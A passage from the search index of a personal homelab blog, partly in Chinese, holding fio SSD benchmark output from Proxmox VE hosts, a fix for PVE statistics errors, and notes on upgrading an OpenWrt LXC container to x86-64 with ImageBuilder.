KiB/s): min=13755, max=264232, per=100.00%, avg=183324.63, stdev=52285.27, samples=111\n   iops        : min= 3438, max=66058, avg=45831.09, stdev=13071.34, samples=111\n  lat (nsec)   : 250=0.01%, 500=0.01%, 750=0.01%, 1000=0.01%\n  lat (usec)   : 2=0.01%, 4=0.01%, 10=0.01%, 20=4.54%, 50=35.97%\n  lat (usec)   : 100=31.58%, 250=27.11%, 500=0.66%, 750=0.10%, 1000=0.03%\n  lat (msec)   : 2=0.01%, 4=0.01%, 10=0.01%, 20=0.01%, 50=0.01%\n  lat (msec)   : 500=0.01%, 750=0.01%, 1000=0.01%, 2000=0.01%\n  cpu          : usr=7.24%, sys=27.70%, ctx=1476701, majf=0, minf=20\n  IO depths    : 1=0.1%, 2=0.1%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, &gt;=64=0.0%\n     submit    : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, &gt;=64=0.0%\n     complete  : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, &gt;=64=0.0%\n     issued rwts: total=2567447,0,0,0 short=0,0,0,0 dropped=0,0,0,0\n     latency   : target=0, window=0, percentile=100.00%, depth=4\nrand-write-4k: (groupid=3, jobs=1): err= 0: pid=788193: Fri Sep 29 23:56:40 2023\n  write: IOPS=30.2k, BW=118MiB/s (124MB/s)(7081MiB/60001msec); 0 zone resets\n    slat (nsec): min=1260, max=40475k, avg=6308.96, stdev=55626.04\n    clat (nsec): min=300, max=1630.1M, avg=125086.99, stdev=2894812.01\n     lat (usec): min=17, max=1630.1k, avg=131.50, stdev=2895.61\n    clat percentiles (usec):\n     |  1.00th=[   21],  5.00th=[   25], 10.00th=[   29], 20.00th=[   49],\n     | 30.00th=[   94], 40.00th=[   98], 50.00th=[  101], 60.00th=[  105],\n     | 70.00th=[  111], 80.00th=[  119], 90.00th=[  149], 95.00th=[  221],\n     | 99.00th=[  498], 99.50th=[  758], 99.90th=[ 3163], 99.95th=[ 6063],\n     | 99.99th=[23725]\n   bw (  KiB/s): min=10431, max=171952, per=100.00%, avg=122835.52, stdev=47622.27, samples=112\n   iops        : min= 2607, max=42988, avg=30708.83, stdev=11905.58, samples=112\n  lat (nsec)   : 500=0.01%, 750=0.01%, 1000=0.01%\n  lat (usec)   : 2=0.01%, 4=0.01%, 10=0.01%, 20=0.73%, 50=19.45%\n  lat (usec)   : 100=25.98%, 250=49.77%, 500=3.06%, 750=0.49%, 1000=0.19%\n  lat (msec)   : 2=0.17%, 4=0.07%, 10=0.05%, 20=0.02%, 50=0.01%\n  lat (msec)   : 100=0.01%, 250=0.01%, 750=0.01%, 2000=0.01%\n  cpu          : usr=4.53%, sys=20.36%, ctx=1376235, majf=0, minf=16\n  IO depths    : 1=0.1%, 2=0.1%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, &gt;=64=0.0%\n     submit    : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, &gt;=64=0.0%\n     complete  : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, &gt;=64=0.0%\n     issued rwts: total=0,1812637,0,0 short=0,0,0,0 dropped=0,0,0,0\n     latency   : target=0, window=0, percentile=100.00%, depth=4\n\nRun status group 0 (all jobs):\n   READ: bw=1841MiB/s (1930MB/s), 1841MiB/s-1841MiB/s (1930MB/s-1930MB/s), io=10.0GiB (10.7GB), run=5563-5563msec\n\nRun status group 1 (all jobs):\n  WRITE: bw=940MiB/s (986MB/s), 940MiB/s-940MiB/s (986MB/s-986MB/s), io=10.0GiB (10.7GB), run=10890-10890msec\n\nRun status group 2 (all jobs):\n   READ: bw=167MiB/s (175MB/s), 167MiB/s-167MiB/s (175MB/s-175MB/s), io=9.79GiB (10.5GB), run=60001-60001msec\n\nRun status group 3 (all jobs):\n  WRITE: bw=118MiB/s (124MB/s), 118MiB/s-118MiB/s (124MB/s-124MB/s), io=7081MiB (7425MB), run=60001-60001msec\n\nDisk stats (read/write):\n  sda: ios=2588374/1830074, merge=92/389, ticks=1241127/2284278, in_queue=3529480, util=95.33%\n</code></pre>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#n5105-\u94e0\u4fa0rc20-500gb","title":"n5105 \u94e0\u4fa0rc20 500GB","text":"<pre><code>root@n5105-pve \u279c  fio fio --filename=test.bin ssd-win-likely.fio\nseq-read-4m: (g=0): rw=read, bs=(R) 4096KiB-4096KiB, (W) 4096KiB-4096KiB, (T) 4096KiB-4096KiB, ioengine=libaio, iodepth=32\nseq-write-4m: (g=1): rw=write, bs=(R) 4096KiB-4096KiB, (W) 4096KiB-4096KiB, (T) 4096KiB-4096KiB, ioengine=libaio, iodepth=32\nrand-read-4k: (g=2): rw=randread, bs=(R) 4096B-4096B, (W) 4096B-4096B, (T) 4096B-4096B, ioengine=libaio, iodepth=4\nrand-write-4k: (g=3): rw=randwrite, bs=(R) 4096B-4096B, (W) 4096B-4096B, (T) 4096B-4096B, ioengine=libaio, iodepth=4\nfio-3.33\nStarting 4 processes\nJobs: 1 (f=1): [_(3),w(1)][59.0%][w=3081KiB/s][w=770 IOPS][eta 02m:19s]\nseq-read-4m: (groupid=0, jobs=1): err= 0: pid=422690: Sat Sep 30 00:46:36 2023\n  read: IOPS=140, BW=560MiB/s (588MB/s)(10.0GiB/18274msec)\n    slat (usec): min=5966, max=22258, avg=7123.69, stdev=945.70\n    clat (usec): min=13, max=331888, avg=219709.66, stdev=21151.42\n     lat (msec): min=6, max=338, avg=226.83, stdev=21.36\n    clat percentiles (msec):\n     |  1.00th=[  180],  5.00th=[  209], 10.00th=[  211], 20.00th=[  213],\n     | 30.00th=[  218], 40.00th=[  218], 50.00th=[  220], 60.00th=[  222],\n     | 70.00th=[  222], 80.00th=[  222], 90.00th=[  226], 95.00th=[  232],\n     | 99.00th=[  296], 99.50th=[  330], 99.90th=[  330], 99.95th=[  330],\n     | 99.99th=[  334]\n   bw (  KiB/s): min=357840, max=614400, per=99.09%, avg=568612.03, stdev=44133.11, samples=36\n   iops        : min=   87, max=  150, avg=138.75, stdev=10.82, samples=36\n  lat (usec)   : 20=0.04%\n  lat (msec)   : 10=0.04%, 20=0.04%, 50=0.20%, 100=0.23%, 250=95.62%\n  lat (msec)   : 500=3.83%\n  cpu          : usr=0.33%, sys=26.03%, ctx=10676, majf=0, minf=32779\n  IO depths    : 1=0.1%, 2=0.1%, 4=0.2%, 8=0.3%, 16=0.6%, 32=98.8%, &gt;=64=0.0%\n     submit    : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, &gt;=64=0.0%\n     complete  : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.1%, 64=0.0%, &gt;=64=0.0%\n     issued rwts: total=2560,0,0,0 short=0,0,0,0 dropped=0,0,0,0\n     latency   : target=0, window=0, percentile=100.00%, depth=32\nseq-write-4m: (groupid=1, jobs=1): err= 0: pid=447378: Sat Sep 30 00:46:36 2023\n  write: IOPS=29, BW=118MiB/s (123MB/s)(7168MiB/60944msec); 0 zone resets\n    slat (usec): min=1337, max=3922.2k, avg=33986.69, stdev=277349.50\n    clat (usec): min=13, max=4661.5k, avg=1053752.98, stdev=1375122.08\n     lat (msec): min=54, max=4680, avg=1087.74, stdev=1395.81\n    clat percentiles (msec):\n     |  1.00th=[   63],  5.00th=[   88], 10.00th=[  105], 20.00th=[  109],\n     | 30.00th=[  144], 40.00th=[  205], 50.00th=[  262], 60.00th=[  531],\n     | 70.00th=[ 1028], 80.00th=[ 2970], 90.00th=[ 3574], 95.00th=[ 3809],\n     | 99.00th=[ 4530], 99.50th=[ 4597], 99.90th=[ 4665], 99.95th=[ 4665],\n     | 99.99th=[ 4665]\n   bw (  KiB/s): min= 8208, max=787386, per=100.00%, avg=306489.37, stdev=235225.24, samples=46\n   iops        : min=    2, max=  192, avg=74.54, stdev=57.29, samples=46\n  lat (usec)   : 20=0.06%\n  lat (msec)   : 100=8.37%, 250=37.67%, 500=13.06%, 750=3.18%, 1000=6.19%\n  lat (msec)   : 2000=10.71%, &gt;=2000=20.76%\n  cpu          : usr=0.86%, sys=5.95%, ctx=26464, majf=0, minf=12\n  IO depths    : 1=0.1%, 2=0.1%, 4=0.2%, 8=0.4%, 16=0.9%, 32=98.3%, &gt;=64=0.0%\n     submit    : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, &gt;=64=0.0%\n     complete  : 0=0.0%, 4=99.9%, 8=0.0%, 16=0.0%, 32=0.1%, 64=0.0%, &gt;=64=0.0%\n     issued rwts: total=0,1792,0,0 short=0,0,0,0 dropped=0,0,0,0\n     latency   : target=0, window=0, percentile=100.00%, depth=32\nrand-read-4k: (groupid=2, jobs=1): err= 0: pid=449479: Sat Sep 30 00:46:36 2023\n  read: IOPS=2352, BW=9409KiB/s (9634kB/s)(551MiB/60001msec)\n    slat (usec): min=6, max=24639, avg=421.40, stdev=272.49\n    clat (usec): min=2, max=36072, avg=1277.22, stdev=607.71\n     lat (usec): min=374, max=42067, avg=1698.61, stdev=744.53\n    clat percentiles (usec):\n     |  1.00th=[  996],  5.00th=[ 1037], 10.00th=[ 1074], 20.00th=[ 1106],\n     | 30.00th=[ 1139], 40.00th=[ 1156], 50.00th=[ 1188], 60.00th=[ 1237],\n     | 70.00th=[ 1287], 80.00th=[ 1352], 90.00th=[ 1483], 95.00th=[ 1614],\n     | 99.00th=[ 2507], 99.50th=[ 3032], 99.90th=[12518], 99.95th=[15401],\n     | 99.99th=[17695]\n   bw (  KiB/s): min= 1744, max=10080, per=99.99%, avg=9408.22, stdev=1395.59, samples=119\n   iops        : min=  436, max= 2520, avg=2351.96, stdev=348.88, samples=119\n  lat (usec)   : 4=0.01%, 500=0.01%, 750=0.03%, 1000=1.37%\n  lat (msec)   : 2=96.73%, 4=1.58%, 10=0.15%, 20=0.14%, 50=0.01%\n  cpu          : usr=0.87%, sys=9.69%, ctx=141627, majf=0, minf=13\n  IO depths    : 1=0.1%, 2=0.1%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, &gt;=64=0.0%\n     submit    : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, &gt;=64=0.0%\n     complete  : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, &gt;=64=0.0%\n     issued rwts: total=141132,0,0,0 short=0,0,0,0 dropped=0,0,0,0\n     latency   : target=0, window=0, percentile=100.00%, depth=4\nrand-write-4k: (groupid=3, jobs=1): err= 0: pid=505899: Sat Sep 30 00:46:36 2023\n  write: IOPS=776, BW=3105KiB/s (3179kB/s)(182MiB/60001msec); 0 zone resets\n    slat (usec): min=8, max=64884, avg=1276.50, stdev=1138.90\n    clat (usec): min=4, max=125427, avg=3870.75, stdev=2918.05\n     lat (usec): min=760, max=168093, avg=5147.25, stdev=3727.98\n    clat percentiles (usec):\n     |  1.00th=[  1680],  5.00th=[  2147], 10.00th=[  2245], 20.00th=[  2376],\n     | 30.00th=[  2507], 40.00th=[  2704], 50.00th=[  3032], 60.00th=[  3982],\n     | 70.00th=[  4817], 80.00th=[  5407], 90.00th=[  5997], 95.00th=[  6521],\n     | 99.00th=[  8848], 99.50th=[ 11338], 99.90th=[ 31065], 99.95th=[ 66323],\n     | 99.99th=[110625]\n   bw (  KiB/s): min= 1405, max= 5016, per=99.72%, avg=3096.45, stdev=976.25, samples=119\n   iops        : min=  351, max= 1254, avg=774.01, stdev=244.12, samples=119\n  lat (usec)   : 10=0.01%, 750=0.01%, 1000=0.01%\n  lat (msec)   : 2=1.54%, 4=58.60%, 10=39.19%, 20=0.46%, 50=0.12%\n  lat (msec)   : 100=0.03%, 250=0.03%\n  cpu          : usr=0.77%, sys=8.83%, ctx=99364, majf=0, minf=10\n  IO depths    : 1=0.1%, 2=0.1%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, &gt;=64=0.0%\n     submit    : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, &gt;=64=0.0%\n     complete  : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, &gt;=64=0.0%\n     issued rwts: total=0,46570,0,0 short=0,0,0,0 dropped=0,0,0,0\n     latency   : target=0, window=0, percentile=100.00%, depth=4\n\nRun status group 0 (all jobs):\n   READ: bw=560MiB/s (588MB/s), 560MiB/s-560MiB/s (588MB/s-588MB/s), io=10.0GiB (10.7GB), run=18274-18274msec\n\nRun status group 1 (all jobs):\n  WRITE: bw=118MiB/s (123MB/s), 118MiB/s-118MiB/s (123MB/s-123MB/s), io=7168MiB (7516MB), run=60944-60944msec\n\nRun status group 2 (all jobs):\n   READ: bw=9409KiB/s (9634kB/s), 9409KiB/s-9409KiB/s (9634kB/s-9634kB/s), io=551MiB (578MB), run=60001-60001msec\n\nRun status group 3 (all jobs):\n  WRITE: bw=3105KiB/s (3179kB/s), 3105KiB/s-3105KiB/s (3179kB/s-3179kB/s), io=182MiB (191MB), run=60001-60001msec\n</code></pre>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#pci-subvendor-id","title":"pci subvendor id","text":"<pre><code>cat /sys/bus/pci/devices/*/uevent\n</code></pre>","tags":["pve"]},{"location":"homelab/2023/09/15/2023-09-15-PVE/#summary\u65f6\u95f4\u4e3a1970","title":"summary\u65f6\u95f4\u4e3a1970","text":"<p>How to Fix Proxmox VE (PVE) keep asking/request login / PVE endless login/web gui login window (&amp; PVE RRD error, statistics error/not updating etc.) &lt; Blog-D without Nonsense (dannyda.com)</p> <pre><code>systemctl stop rrdcached.service\nrm -rf /var/lib/rrdcached\nsystemctl start rrdcached.service\n</code></pre>","tags":["pve"]},{"location":"%E6%8A%98%E8%85%BE/2023/10/30/2023-10-30-openwrt-x86%E5%8D%87%E7%BA%A7/","title":"openwrt x86\u5347\u7ea7","text":"<p>\u6211\u7684\u53f0\u5f0f\u673apve\u5145\u5f53\u8f6f\u8def\u7531\u529f\u80fd\uff0c\u5305\u542b\u4e00\u4e2aopenwrt LXC\u5bb9\u5668\u3002\u8be5\u5bb9\u5668\u4f7f\u7528\u4e86\u5f88\u957f\u65f6\u95f4\uff0c\u914d\u7f6e\u4e86wiregurad\uff0c\u4ee5\u53ca\u590d\u6742\u7684\u9632\u706b\u5899\u548c\u8def\u7531\u89c4\u5219\u3002\u4f46\u662f\u5728\u4e00\u5f00\u59cb\u521b\u5efalxc\u5bb9\u5668\u65f6\uff0crootfs\u9009\u62e9\u4e86x86/generic\u7248\u672c\u3002\u8be5\u7248\u672c\u5b9e\u8d28\u4e0a\u662f32\u4f4d\u7684\u7cfb\u7edf</p> <p>Generic\u00a0is for 32-bit-only hardware (either old hardware or some Atom processors), should be\u00a0i686\u00a0Linux architecture, will work on Pentium 4 and later. Use this only if your hardware can't run the 64-bit version.</p> <p>\u867d\u7136\u4e0d\u77e5\u9053\u4f1a\u5bf9\u6027\u80fd\u7b49\u6709\u591a\u5927\u5f71\u54cd\uff0c\u4f46\u662f\u5bf9\u4e8e\u6709\u70b9\u5b8c\u7f8e\u4e3b\u4e49\u7684\u4eba\u6765\u8bf4\u8fd8\u662f\u65e0\u6cd5\u63a5\u53d7\u3002\u56e0\u6b64\u7814\u7a76\u5982\u4f55\u5c06\u5176\u5347\u7ea7\u523064\u4f4d\u7248\u672c\u3002</p> <p>\u672c\u6765\u4ee5\u4e3a\u5e94\u8be5\u662f\u4e00\u4ef6\u5f88\u7b80\u5355\u7684\u4e8b\u60c5\uff0c\u4f46\u662f\u9605\u8bfbopenwrt wiki\u540e\uff0c\u53d1\u73b0\u5e76\u6ca1\u6709\u60f3\u8c61\u4e2d\u7684\u7b80\u5355\u3002\u5e76\u4e14\u4e5f\u5b66\u4e60\u5230\u4e86\u4e00\u4e9b\u5173\u4e8e\u955c\u50cf\u3001\u5206\u533a\u3001\u6587\u4ef6\u7cfb\u7edf\u7684\u77e5\u8bc6\u3002\u7279\u6b64\u8bb0\u5f55\u3002</p>","tags":["openwrt","\u955c\u50cf"]},{"location":"%E6%8A%98%E8%85%BE/2023/10/30/2023-10-30-openwrt-x86%E5%8D%87%E7%BA%A7/#openwrt-x86\u7684\u4e0d\u540c\u4e4b\u5904","title":"openwrt x86\u7684\u4e0d\u540c\u4e4b\u5904","text":"","tags":["openwrt","\u955c\u50cf"]},{"location":"%E6%8A%98%E8%85%BE/2023/10/30/2023-10-30-openwrt-x86%E5%8D%87%E7%BA%A7/#x86\u4e0d\u540ctarget","title":"x86\u4e0d\u540ctarget","text":"<p>openwrt\u63d0\u4f9b\u4e86\u4e0d\u540c\u7684target\uff0c\u7528\u4e8e\u9002\u5e94\u4e0d\u540c\u8001\u7684\u6216\u65b0\u7684\u786c\u4ef6 - 64\u00a0is for modern PC hardware (anything from around 2007 onward), it is built for 64-bit capable computers and has support for modern CPU features. Choose this unless you have good reasons not to. - Generic\u00a0is for 32-bit-only hardware (either old hardware or some Atom processors), should be\u00a0i686\u00a0Linux architecture, will work on Pentium 4 and later. Use this only if your hardware can't run the 64-bit version. - Legacy\u00a0is for very old PC hardware, Pentium MMX, what is called\u00a0i586\u00a0in Linux architecture support. It will miss a lot of features you want/need on modern hardware like multi-core support and support for more than 4GB of RAM, but will actually run on ancient hardware while other versions will not. - Geode\u00a0is a custom Legacy target customized for Geode SoCs, which are still in use in many (aging) networking devices, like the older Alix boards from PCEngines.</p>","tags":["openwrt","\u955c\u50cf"]},{"location":"%E6%8A%98%E8%85%BE/2023/10/30/2023-10-30-openwrt-x86%E5%8D%87%E7%BA%A7/#\u955c\u50cf\u6587\u4ef6\u4e0e\u5206\u533a\u5e03\u5c40","title":"\u955c\u50cf\u6587\u4ef6\u4e0e\u5206\u533a\u5e03\u5c40","text":"<p>\u6309\u7167root\u5206\u533a\u6587\u4ef6\u7cfb\u7edf\u683c\u5f0f\u7684\u4e0d\u540c\uff0c\u4e3b\u8981\u63d0\u4f9b\u4e86ext4\u548csqushfs\u4e24\u79cd\u7c7b\u578b\u7684\u955c\u50cf\u6587\u4ef6\u3002ext4\u53ef\u4ee5\u5229\u7528\u5168\u90e8\u7684\u78c1\u76d8\u7a7a\u95f4\uff0c\u800c\u63d0\u4f9b\u7684squshfs\u955c\u50cfroot\u5206\u533a\u9ed8\u8ba4\u53ea\u6709100MB\u3002\u56e0\u6b64x86\u5e73\u53f0\u7528\u7684\u6bd4\u8f83\u5e7f\u6cdb\u7684\u662fext4\u683c\u5f0f\u7684\u955c\u50cf\u3002 p.s \u731c\u6d4b\u662fext4\u652f\u6301\u914d\u7f6e\u6210\u52a8\u6001\u7684\u5927\u5c0f\uff0c\u800csqushfs\u6587\u4ef6\u7cfb\u7edf\u7684\u5927\u5c0f\u9700\u8981\u9759\u6001\u6307\u5b9a</p> <ul> <li>squashfs-combined-efi.img.gz<ul> <li>16MB\u7684/boot\u5206\u533a\uff0cext4\u6587\u4ef6\u7cfb\u7edf\uff0c\u7528\u4e8e\u5b58\u50a8grub2\u548clinux kernel</li> <li>104MB\u7684 root\u5206\u533a\uff0c\u5305\u542b\u53ea\u8bfb\u7684squashfs\u6587\u4ef6\u7cfb\u7edf\u548c\u53ef\u8bfb\u5199\u7684f2fs\u6587\u4ef6\u7cfb\u7edf\uff08overlay\uff09</li> <li>\u4efb\u4f55\u989d\u5916\u7684\u7a7a\u95f4\u662f\u672a\u5206\u914d\u7684</li> </ul> </li> <li> <p>ext4-combined-efi.img.gz</p> <ul> <li>16MB\u7684/boot\u5206\u533a\uff0cext4\u6587\u4ef6\u7cfb\u7edf\uff0c\u7528\u4e8e\u5b58\u50a8grub2\u548clinux kernel</li> <li>root\u5206\u533a\uff0cext4\u6587\u4ef6\u7cfb\u7edf</li> <li>\u53ef\u4ee5\u5229\u7528\u6574\u5757\u78c1\u76d8</li> <li>\u65e0\u6cd5\u4f7f\u7528Failsafe Mode\u548c\u6062\u590d\u51fa\u5382\u8bbe\u7f6e</li> </ul> </li> <li> <p>\u53e6\u5916\u8fd8\u63d0\u4f9b\u4e86xx-rootfs.img.gz\uff0c\u7528\u4e8e\u4ec5\u66f4\u65b0root\u5206\u533a\uff0c\u4e0d\u50cfcombined\u955c\u50cf\u4f1a\u8986\u76d6\u6574\u4e2a\u78c1\u76d8</p> </li> <li>\u955c\u50cf\u6587\u4ef6\u540d\u79f0\u6709\u65e0efi\uff0c\u8868\u793a\u91c7\u7528EFI\u542f\u52a8\u8fd8\u662fPC BIOS\u542f\u52a8</li> <li>\u53e6\u5916\u8fd8\u63d0\u4f9b\u4e86rootfs\u7684\u538b\u7f29\u6587\u4ef6rootfs.tar.gz\u3002rootfs\u53ef\u4ee5\u76f4\u63a5\u7528\u4e8e\u521b\u5efalxc\u5bb9\u5668\u3002</li> </ul> <p>\u5176\u5b83 - \u6269\u5c55root\u5206\u533a - \u6dfb\u52a0\u989d\u5916\u5206\u533a</p>","tags":["openwrt","\u955c\u50cf"]},{"location":"%E6%8A%98%E8%85%BE/2023/10/30/2023-10-30-openwrt-x86%E5%8D%87%E7%BA%A7/#\u5347\u7ea7\u65b9\u6cd5","title":"\u5347\u7ea7\u65b9\u6cd5","text":"<p>If your installation used the\u00a0<code>ext4-combined.img.gz</code>\u00a0image to install, there are several options for upgrading:</p> <ol> <li>Write a new\u00a0<code>ext4-combined.img.gz</code>\u00a0image: this is the simplest option and is identical to first installation: all data, configs, packages and extra partitions will be erased and you'll have a brand new OpenWrt system with default packages and configs. You will need to reinstall all packages, copy config files back, and create any additional partitions you require.</li> <li>Use\u00a0<code>sysupgrade</code>: this is default upgrading procedure but the least recommended option for x86 machines. Proceed to\u00a0Sysupgrade\u00a0for details.</li> <li>Extract the boot partition image from\u00a0<code>ext4-combined.img.gz</code>\u00a0and write it and the\u00a0<code>ext4-rootfs.img.gz</code>, leaving the Master Boot Record and partition table intact.</li> <li>Extract the boot partition image from\u00a0<code>ext4-combined.img.gz</code>\u00a0and write it and then uncompress the\u00a0<code>rootfs.tar.gz</code>\u00a0to the existing root filesystem.</li> </ol> <p>\u4e0d\u50cf\u4f20\u7edftarget\uff0c\u6ca1\u6709sysupgrade.bin\u6587\u4ef6\u3002\u53e6\u5916\u5b98\u65b9wiki\u4e5f\u4e0d\u63a8\u8350\u4f7f\u7528sysupgrade\u5347\u7ea7\uff08\u547d\u4ee4\u884c\u6216\u8005luci\uff09\uff1a[OpenWrt Wiki] Upgrading OpenWrt firmware using CLI</p> <p>Download and use only OpenWrt firmware images ending in\u00a0\u201c-sysupgrade.bin\u201d\u00a0for command line upgrades. For x86 systems there is no \u201csysupgrade\u201d image, just be sure the new firmware image has the same family of filesystem as your old one.</p> <p>\u57fa\u672c\u4e0a\u9700\u8981\u8986\u76d6\u6574\u4e2arootfs\uff0c\u5e76\u4e14\u4e0d\u5efa\u8bae\u76f4\u63a5\u8986\u76d6\uff0c\u800c\u662f\u5c06old\u8986\u76d6\u5230clean\u7684\u65b0\u7248\u672c\u4e0a\u3002</p> <p>\u81f3\u4e8e\u5982\u4f55\u83b7\u5f97rootfs\uff0c\u53ef\u4ee5\u4eceimage\u6587\u4ef6\u4e2d\u63d0\u53d6 - loseup - dd</p>","tags":["openwrt","\u955c\u50cf"]},{"location":"%E6%8A%98%E8%85%BE/2023/10/30/2023-10-30-openwrt-x86%E5%8D%87%E7%BA%A7/#imagebuilder\u81ea\u5b9a\u4e49\u955c\u50cf","title":"ImageBuilder\u81ea\u5b9a\u4e49\u955c\u50cf","text":"<p>Image Builder\u7528\u4e8e\u81ea\u5b9a\u4e49\u955c\u50cf\uff0c\u800c\u4e0d\u7528\u4ece\u6e90\u7801\u7f16\u8bd1\u3002\u5b83\u4eceopenwrt\u5b98\u65b9\u4ed3\u5e93\u4e0b\u8f7dpackages\u5e76\u5c06\u5176\u6253\u5305\u5230\u4e00\u4e2a\u955c\u50cf\u6587\u4ef6\u3002</p> <p>openwrt\u6709\u4e00\u4e2aAttendedsysupgrade Server\uff0c\u53ef\u4ee5\u5728\u7ebf\u6784\u5efa\u81ea\u5b9a\u4e49\u7684\u955c\u50cf - \u914d\u5408luci\u5ba2\u6237\u7aef\uff0c\u53ef\u4ee5\u5b9e\u73b0\u4fdd\u6301\u539f\u672c\u7684\u8f6f\u4ef6\u5e76\u4e14\u5347\u7ea7\u7cfb\u7edf\uff0c\u8be6\u60c5\uff1aopenwrt/asu: An image on demand server for OpenWrt based distributions (github.com) \u5e76\u4e14\u8fd8\u63d0\u4f9b\u4e86\u4e00\u4e2agrafana\u56fe\u8868\uff0c\u7528\u4e8e\u89c2\u5bdf\u5404cpu\uff0c\u8def\u7531\u5668\u5360\u6bd4\uff1aAttended Sysupgrade Server - Grafana (openwrt.org)</p>","tags":["openwrt","\u955c\u50cf"]},{"location":"%E6%8A%98%E8%85%BE/2023/10/30/2023-10-30-openwrt-x86%E5%8D%87%E7%BA%A7/#\u5b89\u88c5","title":"\u5b89\u88c5","text":"<p>\u4eceopenwrt\u4e0b\u8f7d\u955c\u50cf\u9875\u9762\u4e0b\u8f7d</p> <p></p> <p>\u4f7f\u7528\u9700\u8981\u4e00\u4e9b\u4f9d\u8d56 <pre><code>sudo apt install build-essential libncurses-dev libncursesw-dev \\\nzlib1g-dev gawk git gettext libssl-dev xsltproc rsync wget unzip python3\n</code></pre></p>","tags":["openwrt","\u955c\u50cf"]},{"location":"%E6%8A%98%E8%85%BE/2023/10/30/2023-10-30-openwrt-x86%E5%8D%87%E7%BA%A7/#\u4f7f\u7528","title":"\u4f7f\u7528","text":"Variable Description <code>PROFILE</code> Specifies the target image to build <code>PACKAGES</code> A list of packages to embed into the image <code>FILES</code> Directory with custom files to include <code>BIN_DIR</code> Alternative output directory for the images <code>EXTRA_IMAGE_NAME</code> Add this to the output image filename (sanitized) <code>DISABLED_SERVICES</code> A list of services to disable <pre><code>make help\nmake info\n\nmake image \\\nPACKAGES=\"luci -dnsmasq dnsmasq-full bash zsh vim-full tmux python3 git git-http htop tcpdump mtr-json curl ip-full iperf3 ss bind-dig conntrack file qrencode luci-app-wireguard wireguard-tools kmod-wireguard gre kmod-gre kmod-gre6 luci-app-ddns luci-app-upnp luci-app-shadowsocks-libev shadowsocks-libev-config shadowsocks-libev-ss-server adguardhome zerotier\" \\\nFILES=\"files\"\n\nmake clean\n</code></pre> <ul> <li>\u6307\u5b9a\u7684\u5305\u4f1a\u81ea\u52a8\u5b89\u88c5\u4f9d\u8d56</li> <li>x86\u4e0d\u9700\u8981\u6307\u5b9aprofile\uff0c\u6216\u8005\u6307\u5b9a\u4e3ageneric <pre><code>\u279c  openwrt-imagebuilder-23.05.0-x86-64.Linux-x86_64 make info\nCurrent Target: \"x86/64\"\nCurrent Architecture: \"x86_64\"\n...\nAvailable Profiles:\n\ngeneric:\n    Generic x86/64\n    ...\n</code></pre></li> </ul> <p>\u751f\u6210\u7684\u8f93\u51fa bin/targets/x86/64</p>","tags":["openwrt","\u955c\u50cf"]},{"location":"%E6%8A%98%E8%85%BE/2023/10/30/2023-10-30-openwrt-x86%E5%8D%87%E7%BA%A7/#\u4fee\u6539\u4ed3\u5e93","title":"\u4fee\u6539\u4ed3\u5e93","text":"<p>repositories.conf</p> <p>\u5982\u679c\u81ea\u5df1\u6709\u7f16\u8bd1openwrt\uff0c\u90a3\u4e48\u53ef\u4ee5\u7f16\u8bd1\u65f6\u6307\u5b9a\u751f\u6210image builder\u3002\u8fd9\u6837\u8fd8\u80fd\u907f\u514d\u4eceopenwrt\u4e0b\u8f7dpackage\u3002</p>","tags":["openwrt","\u955c\u50cf"]},{"location":"%E6%8A%98%E8%85%BE/2023/10/30/2023-10-30-openwrt-x86%E5%8D%87%E7%BA%A7/#\u589e\u52a0root\u5206\u533a\u5927\u5c0f","title":"\u589e\u52a0root\u5206\u533a\u5927\u5c0f","text":"<p>\u4fee\u6539.config\uff0c\u5355\u4f4dMB <pre><code>CONFIG_TARGET_KERNEL_PARTSIZE=128\nCONFIG_TARGET_ROOTFS_PARTSIZE=512\n</code></pre></p>","tags":["openwrt","\u955c\u50cf"]},{"location":"%E6%8A%98%E8%85%BE/2023/10/30/2023-10-30-openwrt-x86%E5%8D%87%E7%BA%A7/#lxcimagebuilder\u5347\u7ea7","title":"LXC+ImageBuilder\u5347\u7ea7","text":"<p>LXC\u4f18\u70b9 - \u7531\u4e8e\u4e0d\u6d89\u53ca\u5230boot\uff0c\u56e0\u6b64\u5b9e\u9645\u4e0a\u53ea\u9700\u8981\u66f4\u65b0rootfs\u5373\u53ef\u3002 - \u4f46\u662f\u7f3a\u70b9\u5c31\u662f\u65e0\u6cd5\u4f7f\u7528squash\u683c\u5f0f\u7684\u955c\u50cf\u4e86\u3002\u4f46\u662f\u7531\u4e8e\u6211\u53ef\u4ee5\u5229\u7528zfs\uff0c\u81ea\u5df1\u5bf9lxc\u5bb9\u5668\u5feb\u7167\uff0c\u56e0\u6b64\u5b9e\u9645\u4e0a\u662f\u66f4\u7075\u6d3b\u7684\u3002</p> <ol> <li>\u521b\u5efa\u955c\u50cf<ul> <li>\u6307\u5b9a\u9700\u8981\u5b89\u88c5\u7684package\u3002\u6ce8\u610f\u522b\u5fd8\u4e86luci<ul> <li>\u7531\u4e8e\u5b89\u88c5\u4e86\u5f88\u591a\u5305\uff0c\u56e0\u6b64\u9700\u8981\u589e\u5927root\u5206\u533a\u5927\u5c0f</li> </ul> </li> <li>\u6dfb\u52a0\u5907\u4efd\u914d\u7f6e\u6587\u4ef6<ul> 